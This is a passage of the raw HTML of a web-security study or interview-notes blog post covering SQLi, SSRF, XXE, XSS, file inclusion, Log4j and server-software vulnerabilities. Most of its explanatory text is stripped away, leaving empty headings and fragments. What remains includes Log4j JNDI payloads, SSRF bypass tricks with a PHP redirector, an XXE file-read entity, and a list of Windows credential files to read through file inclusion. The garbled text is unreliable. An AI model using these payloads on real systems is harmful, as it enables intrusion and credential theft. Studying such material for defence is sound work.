class=\"line\">9001SupervisordSupervisord(CVE-2017-11610)Supervisord(CVE-2017-11610)</span><br><span class=\"line\">9043/9090WebSphereWebSphere</span><br><span class=\"line\">9200/9300Elasticsearch Elasticsearch</span><br><span class=\"line\">10000Webmin-Web</span><br><span class=\"line\">10001/10002JmxRemoteLifecycleListenerTomcatTomcat(CVE-2016-8735)</span><br><span class=\"line\">11211Memcached Memcached</span><br><span class=\"line\">27017/27018MongoDB MongoDB</span><br><span class=\"line\">50000SAP Management Console </span><br><span class=\"line\">50070Hadoop Hadoop</span><br><span class=\"line\">61616Apache ActiveMQ Apache ActiveMQCVE-2016-3088</span><br><span class=\"line\">60020hbase.regionserver.portHRegionServerRPC</span><br><span class=\"line\">60030hbase.regionserver.info.portHRegionServerhttp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"15-\"><a href=\"#15-\" class=\"headerlink\" title=\"15.\"></a>15.</h3><h5 id=\"Log4j2\"><a href=\"#Log4j2\" class=\"headerlink\" title=\"Log4j2\"></a>Log4j2</h5><p><a class=\"link\"   href=\"https://juejin.cn/post/7202514143341002789\" >https://juejin.cn/post/7202514143341002789<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"spring-core-rce-2022-03-29\"><a href=\"#spring-core-rce-2022-03-29\" class=\"headerlink\" title=\"spring-core-rce-2022-03-29\"></a>spring-core-rce-2022-03-29</h5><p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_45632448/article/details/124190382\" >https://blog.csdn.net/weixin_45632448/article/details/124190382<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"16-web\"><a href=\"#16-web\" class=\"headerlink\" title=\"16.web\"></a>16.web</h3><ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h2 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h2><hr>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><h3 id=\"1-top-chunk-house-of-force-\"><a href=\"#1-top-chunk-house-of-force-\" class=\"headerlink\" title=\"1.top chunk(house of force)\"></a>1.top chunk(house of force)</h3><ol>\n<li>Windows Meterpreter Reverse TCP shellcode shellcode  Metasploit  Meterpreter </li>\n<li>Windows Reverse TCP shellcode shellcode  Windows  shell </li>\n<li>Windows Reverse HTTP shellcode shellcode  Windows  HTTP </li>\n<li>Beacon Payload shellcode shellcode  Cobalt Strike  Beacon </li>\n<li>Linux Reverse TCP shellcode shellcode  Linux  shell </li>\n<li>Mac Reverse TCP shellcode shellcode  Mac  shell </li>\n</ol>\n<h3 id=\"2-6379-8009\"><a href=\"#2-6379-8009\" class=\"headerlink\" title=\"2.6379,8009\"></a>2.6379,8009</h3><ul>\n<li>6379redis</li>\n<li>8009<code>Apache-Tomcat-Ajp</code>tomcatajp8009</li>\n</ul>\n<h3 id=\"3-Cobalt-strike-shellcode\"><a href=\"#3-Cobalt-strike-shellcode\" class=\"headerlink\" title=\"3.Cobalt strike shellcode?\"></a>3.Cobalt strike shellcode?</h3><p></p>\n<h3 id=\"4-Apache-\"><a href=\"#4-Apache-\" class=\"headerlink\" title=\"4.Apache \"></a>4.Apache </h3><blockquote>\n<p>apacheapachetest.php.abcmime.typeswindowsapache</p>\n</blockquote>\n<p>phpinfo.phpphpinfo.php.abc</p>\n<h3 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5. \"></a>5. </h3><p><strong>iis</strong></p>\n<h3 id=\"6-xxe\"><a href=\"#6-xxe\" class=\"headerlink\" title=\"6.xxe\"></a>6.xxe</h3><p>php:&#x2F;&#x2F;filter</p>\n<h3 id=\"7-S2-052\"><a href=\"#7-S2-052\" class=\"headerlink\" title=\"7.S2_052\"></a>7.S2_052</h3><p><strong>JBoss &#x2F;jmx-console&#x2F;HtmlAdaptor </strong>JMX</p>\n<h3 id=\"8-Weblogic-\"><a href=\"#8-Weblogic-\" class=\"headerlink\" title=\"8.Weblogic \"></a>8.Weblogic </h3><ul>\n<li><strong>XMLDecoder</strong></li>\n<li><strong>T3</strong></li>\n<li><strong></strong></li>\n<li><strong></strong></li>\n<li><strong>IIOP</strong></li>\n<li><strong>SSRF</strong></li>\n</ul>\n<h3 id=\"9-Jboss-\"><a href=\"#9-Jboss-\" class=\"headerlink\" title=\"9.Jboss \"></a>9.Jboss </h3><ul>\n<li><strong></strong></li>\n<li><strong></strong></li>\n</ul>\n<h3 id=\"10-Struts2-\"><a href=\"#10-Struts2-\" class=\"headerlink\" title=\"10.Struts2 \"></a>10.Struts2 </h3><ul>\n<li></li>\n</ul>\n<h3 id=\"11-Fastbin-\"><a href=\"#11-Fastbin-\" class=\"headerlink\" title=\"11.Fastbin \"></a>11.Fastbin </h3><p></p>\n<ol>\n<li> Fastbin </li>\n<li> glibc  Fastbin </li>\n<li> Fastbin </li>\n<li> glibc  Fastbin </li>\n</ol>\n<h3 id=\"12-Ssrf-\"><a href=\"#12-Ssrf-\" class=\"headerlink\" title=\"12.Ssrf \"></a>12.Ssrf </h3><p><strong><u></u></strong></p>\n<h3 id=\"13-ssrf-getpost\"><a href=\"#13-ssrf-getpost\" class=\"headerlink\" title=\"13.ssrf getpost\"></a>13.ssrf getpost</h3><p></p>\n<h3 id=\"14-Log4j-\"><a href=\"#14-Log4j-\" class=\"headerlink\" title=\"14.Log4j \"></a>14.Log4j </h3><ul>\n<li><p><strong>portwafip:port</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;jndi:ldap:192.168.1.1/a&#125;</span><br><span class=\"line\"> $&#123;jndi:ldap:192.168.1.1:/a&#125; </span><br><span class=\"line\">ldap389</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n</li>\n<li><p><strong>IP</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;jndi:ldap://[192.168.34.96]/a&#125; </span><br><span class=\"line\">$&#123;jndi:ldap://[192.168.34.96]]/a&#125; </span><br><span class=\"line\"> LdapURL&quot;[ip]&quot;LdapCtx[]ip389</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"15-oggphp\"><a href=\"#15-oggphp\" class=\"headerlink\" title=\"15.oggphp\"></a>15.oggphp</h3><p>OGGPHPPHPPHPPHPfile:&#x2F;&#x2F;http:&#x2F;&#x2F;HTTP</p>\n<h3 id=\"16-Zip-php\"><a href=\"#16-Zip-php\" class=\"headerlink\" title=\"16. Zip:&#x2F;&#x2F;php\"></a>16. Zip:&#x2F;&#x2F;php</h3><p><code>zip://</code>  PHP 5.2.0  PHP  PHP  ZIP </p>\n<h3 id=\"17--asp\"><a href=\"#17--asp\" class=\"headerlink\" title=\"17..asp\"></a>17..asp</h3><h3 id=\"18-Nginx-apache\"><a href=\"#18-Nginx-apache\" class=\"headerlink\" title=\"18.Nginx,apache\"></a>18.Nginx,apache</h3><p></p>\n<h3 id=\"19-Dom-xssxss\"><a href=\"#19-Dom-xssxss\" class=\"headerlink\" title=\"19.Dom xssxss\"></a>19.Dom xssxss</h3><blockquote>\n<p>DOM  XSS  XSS  XSS  DOM  XSS  DOM </p>\n</blockquote>\n<h3 id=\"20-Ms17-010\"><a href=\"#20-Ms17-010\" class=\"headerlink\" title=\"20.Ms17_010\"></a>20.Ms17_010</h3><p>445</p>\n<h3 id=\"21-Sqlmap-user-agent\"><a href=\"#21-Sqlmap-user-agent\" class=\"headerlink\" title=\"21.Sqlmap user-agent\"></a>21.Sqlmap user-agent</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--random-agent</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"22-Xp-cmdshell-\"><a href=\"#22-Xp-cmdshell-\" class=\"headerlink\" title=\"22.Xp_cmdshell \"></a>22.Xp_cmdshell </h3><p><code> Microsoft SQL Server </code></p>\n<h3 id=\"23-Symlink\"><a href=\"#23-Symlink\" class=\"headerlink\" title=\"23.Symlink\"></a>23.Symlink</h3><p></p>\n<h3 id=\"24-Samba-wannacry\"><a href=\"#24-Samba-wannacry\" class=\"headerlink\" title=\"24.Samba wannacry\"></a>24.Samba wannacry</h3><ul>\n<li> Samba Samba EternalBlue </li>\n<li> SMBv1 Samba  SMBv1  WannaCry  SMBv1  Windows  SMBv1 </li>\n<li> Windows  SMBv1 </li>\n<li> Samba  Samba </li>\n<li> Samba </li>\n</ul>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h1><h3 id=\"1-owasp-top-10\"><a href=\"#1-owasp-top-10\" class=\"headerlink\" title=\"1.owasp top 10\"></a>1.owasp top 10</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.SQL</span><br><span class=\"line\">2.</span><br><span class=\"line\">3.XSS</span><br><span class=\"line\">4.</span><br><span class=\"line\">5.</span><br><span class=\"line\">6.</span><br><span class=\"line\">7.</span><br><span class=\"line\">8.CSRF</span><br><span class=\"line\">9.</span><br><span class=\"line\">10.</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"2-sql\"><a href=\"#2-sql\" class=\"headerlink\" title=\"2.sql\"></a>2.sql</h3><p><strong>sql</strong></p>\n<blockquote>\n<p>SQL</p>\n<p>SQLSQL</p>\n<p>SQL</p>\n</blockquote>\n<p><strong>sql</strong></p>\n<p></p>\n<ul>\n<li></li>\n<li></li>\n</ul>\n<p></p>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<p><strong>sql</strong></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p><strong></strong></p>\n<ul>\n<li>updatexml()</li>\n<li>extractvalue()</li>\n<li>floor()</li>\n</ul>\n<p><strong>sql</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* */%a0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">limitfromoffsetsubstrfrom for</span><br><span class=\"line\">&lt;&gt;greatest()</span><br><span class=\"line\">and=&amp;&amp;  or=||</span><br><span class=\"line\">=   like </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>sql</strong></p>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<p><strong>Sql server </strong></p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/74546690\" >https://zhuanlan.zhihu.com/p/74546690<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h3><p><strong></strong></p>\n<blockquote>\n<p><strong></strong></p>\n</blockquote>\n<p><strong></strong></p>\n<ul>\n<li>js</li>\n<li>(MIME)</li>\n<li></li>\n<li></li>\n</ul>\n<p><strong>()</strong></p>\n<ul>\n<li>.htaccess</li>\n<li>.user.ini</li>\n<li>%00</li>\n</ul>\n<h3 id=\"3-SSRF\"><a href=\"#3-SSRF\" class=\"headerlink\" title=\"3.SSRF\"></a>3.SSRF</h3><blockquote>\n<p> <strong>SSRF</strong>Server-Side Request  Forgery  ssrf  webURL  URLweb  web   SSRFSSRF </p>\n</blockquote>\n<p><strong>ssrf</strong></p>\n<ul>\n<li></li>\n<li></li>\n<li>web</li>\n<li></li>\n<li>file</li>\n</ul>\n<p><strong>Ssrf</strong></p>\n<ul>\n<li>WebHTTPHTTPS</li>\n<li>IP</li>\n<li></li>\n</ul>\n<p><strong>Ssrf</strong></p>\n<ul>\n<li><p>@</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://www.xxx.com@www.kxsy.work/</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>IP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">120.26.86.156</span><br><span class=\"line\"> = 1111000000110100101011010011100</span><br><span class=\"line\"> = 0x781A569C</span><br><span class=\"line\"> = 2014992028</span><br></pre></td></tr></table></figure>\n</li>\n<li><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.985.so/</span><br><span class=\"line\">http://www.kxsy.work/ = http://u6.gg/ks69x</span><br></pre></td></tr></table></figure>\n</li>\n<li><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">http://www.kxsy.work/ = http://wwwkxsywork/</span><br><span class=\"line\">localhost0.0.0.0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>302</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$schema = $_GET[&#x27;s&#x27;];</span><br><span class=\"line\">$ip     = $_GET[&#x27;i&#x27;];</span><br><span class=\"line\">$port   = $_GET[&#x27;p&#x27;];</span><br><span class=\"line\">$query  = $_GET[&#x27;q&#x27;];</span><br><span class=\"line\">if(empty($port))&#123;  </span><br><span class=\"line\">    header(&quot;Location: $schema://$ip/$query&quot;); </span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>xio.ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class=\"line\">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class=\"line\">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class=\"line\">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class=\"line\">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class=\"line\">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Enclosed alphanumerics</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Enclosed alphanumerics</span><br><span class=\"line\">. &gt;&gt;&gt; http://example.com</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"4-XXE\"><a href=\"#4-XXE\" class=\"headerlink\" title=\"4.XXE\"></a>4.XXE</h3><p><strong>XXE</strong></p>\n<blockquote>\n<p>XXEXML External Entity InjectionXMl</p>\n</blockquote>\n<p>XXExmlxmlDos xxexml</p>\n<p><strong>XXE</strong></p>\n<p>php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$xml=simplexml_load_string($_GET[&#x27;xml&#x27;]);</span><br><span class=\"line\">print_r($xml);</span><br><span class=\"line\">?&gt;\t</span><br></pre></td></tr></table></figure>\n\n<p>xmlURL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE playwin [</span><br><span class=\"line\">&lt;!ENTITY name SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/1.txt&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;resume&gt;</span><br><span class=\"line\">&lt;name&gt; &amp;name; &lt;/name&gt;</span><br><span class=\"line\">&lt;/resume&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><strong>Xxe</strong></p>\n<p></p>\n<h3 id=\"5-\"><a href=\"#5-\" class=\"headerlink\" title=\"5.\"></a>5.</h3><p><strong></strong></p>\n<p>php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">require() // </span><br><span class=\"line\"></span><br><span class=\"line\">require_once() // </span><br><span class=\"line\"></span><br><span class=\"line\">include() // </span><br><span class=\"line\"></span><br><span class=\"line\">include_once() // </span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php</span><br><span class=\"line\">php://filter</span><br><span class=\"line\">php://input</span><br><span class=\"line\">file://</span><br><span class=\"line\">phar://</span><br><span class=\"line\">zip://</span><br><span class=\"line\">data://</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong></strong></p>\n<p>getshell</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\boot.ini //</span><br><span class=\"line\">C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS</span><br><span class=\"line\">C:\\Windows\\repair\\sam //</span><br><span class=\"line\">C:\\Program Files\\mysql\\my.ini //Mysql</span><br><span class=\"line\">C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root</span><br><span class=\"line\">C:\\Windows\\php.ini //php</span><br><span class=\"line\">C:\\Windows\\my.ini //Mysql</span><br><span class=\"line\">C:\\Windows\\win.ini //Windows</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"6-Phpphp\"><a href=\"#6-Phpphp\" class=\"headerlink\" title=\"6.Phpphp\"></a>6.Phpphp</h3><p><strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assert()</span><br><span class=\"line\">eval()</span><br><span class=\"line\">call_user_func()</span><br><span class=\"line\">call_user_func_array()</span><br><span class=\"line\">preg_replace()  //7.0</span><br><span class=\"line\">array_map()</span><br><span class=\"line\">Usort()</span><br></pre></td></tr></table></figure>\n\n<p><strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">system()</span><br><span class=\"line\">exec()</span><br><span class=\"line\">passthru()</span><br><span class=\"line\">shell_exec()</span><br><span class=\"line\">poopen()</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"7-XSS\"><a href=\"#7-XSS\" class=\"headerlink\" title=\"7.XSS\"></a>7.XSS</h3><p><strong>XSS</strong></p>\n<blockquote>\n<p>HTML&lt;HTMLHTMLHTMLJavaScriptXSS</p>\n</blockquote>\n<p><strong>xss</strong></p>\n<blockquote>\n<p>1.</p>\n<p> XSS  URL</p>\n<p> URL  XSS  XSS</p>\n<p> XSS  Cookies <br>2.</p>\n<p>XSS</p>\n<p> XSS <br>3.DOM</p>\n<p>DOMXSSweb serverXSS URL  JavaScript  DOM-based XSS  document.URL location.hash location.search document.referrer </p>\n</blockquote>\n<p><strong>Domxssxss</strong></p>\n<p>DOMxssxssJavaScript</p>\n<p><strong>Xss</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.Cookie</span><br><span class=\"line\">2.</span><br><span class=\"line\">3.XSS</span><br><span class=\"line\">4.XSS</span><br><span class=\"line\">5.XSS</span><br><span class=\"line\">6.</span><br><span class=\"line\">7.</span><br><span class=\"line\">8.</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>XSS</strong></p>\n<blockquote>\n<p>1URL()</p>\n<p>&lt;&gt;<br>2HTML</p>\n<p>jshtmlXSS<br><a class=\"link\"   href=\"https://www.cnblogs.com/dearxinli/p/5466286.html\" >https://www.cnblogs.com/dearxinli/p/5466286.html<i class=\"fas fa-external-link-alt\"></i></a><br>3</p>\n<p>HTMLXSS</p>\n</blockquote>\n<h3 id=\"8-\"><a href=\"#8-\" class=\"headerlink\" title=\"8.\"></a>8.</h3><p><strong>Nginx</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/Spontaneous_0/article/details/129106641\" >https://blog.csdn.net/Spontaneous_0/article/details/129106641<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><strong>Apache</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_44174581/article/details/119387616\" >https://blog.csdn.net/weixin_44174581/article/details/119387616<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<p><strong>lls</strong></p>\n<blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/weixin_43625577/article/details/91971796\" >https://blog.csdn.net/weixin_43625577/article/details/91971796<i class=\"fas fa-external-link-alt\"></i></a></p>\n</blockquote>\n<h3 id=\"9-\"><a href=\"#9-\" class=\"headerlink\" title=\"9.\"></a>9.</h3><p> <strong>Xray</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">XSS (key: xss)</span><br><span class=\"line\">SQL  (key: sqldet)</span><br><span class=\"line\">/ (key: cmd-injection)</span><br><span class=\"line\"> (key: dirscan)</span><br><span class=\"line\"> (key: path-traversal)</span><br><span class=\"line\">XML  (key: xxe)</span><br><span class=\"line\"> (key: upload)</span><br><span class=\"line\"> (key: brute-force)</span><br><span class=\"line\">jsonp  (key: jsonp)</span><br><span class=\"line\">ssrf  (key: ssrf)</span><br><span class=\"line\"> (key: baseline)</span><br><span class=\"line\"> (key: redirect)</span><br><span class=\"line\">CRLF  (key: crlf-injection)</span><br><span class=\"line\">Struts2  (key: struts)</span><br><span class=\"line\">Thinkphp (key: thinkphp)</span><br><span class=\"line\">POC  (key: phantasm)</span><br></pre></td></tr></table></figure>\n\n<p>Avws</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.WebScannerWeb</span><br><span class=\"line\">2.Site Crawler</span><br><span class=\"line\">3.Target Finderweb</span><br><span class=\"line\">4.Subdomain ScannerDNS</span><br><span class=\"line\">5.Blind SQL Injector</span><br><span class=\"line\">6.HTTP Editorhttp</span><br><span class=\"line\">7.HTTP SnifferHTTP</span><br><span class=\"line\">8.HTTP Fuzzer</span><br><span class=\"line\">9.Authentication TesterWeb</span><br><span class=\"line\">10.Web Srevice ScannerWeb</span><br><span class=\"line\">11.Web Srevice EditorWeb</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"10-sqlmap\"><a href=\"#10-sqlmap\" class=\"headerlink\" title=\"10.sqlmap\"></a>10.sqlmap</h3><ul>\n<li><code>-v</code> 0python 12debug3payload4http5http7http</li>\n<li><code>-u</code>urlurl <code>?xx=xxx</code> </li>\n<li><code>-r</code>posttxtmsqlmappost</li>\n<li><code>--data=Data</code><code>-u &quot;www.abc.com/index.php?id=1&quot; --data=&quot;name=1&amp;pass=2&quot;</code></li>\n<li><code>--random-agent</code>user-agentsqlmapuser-agent<code>sqlmap/txt/user-agent.txt</code> <strong>level&gt;&#x3D;3user-agent</strong></li>\n<li><code>--os-shell</code>shellmetepreterVNC</li>\n<li><code>--cookie</code>cookie <code>-u &quot;www.abc.com/index.php?id=1&quot;</code></li>\n</ul>\n<h3 id=\"11-\"><a href=\"#11-\" class=\"headerlink\" title=\"11.\"></a>11.</h3><h5 id=\"Tomcat\"><a href=\"#Tomcat\" class=\"headerlink\" title=\"Tomcat\"></a><strong>Tomcat</strong></h5><p></p>\n<p><a class=\"link\"   href=\"https://zhuanlan.zhihu.com/p/137686820\" >https://zhuanlan.zhihu.com/p/137686820<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h5 id=\"iis\"><a href=\"#iis\" 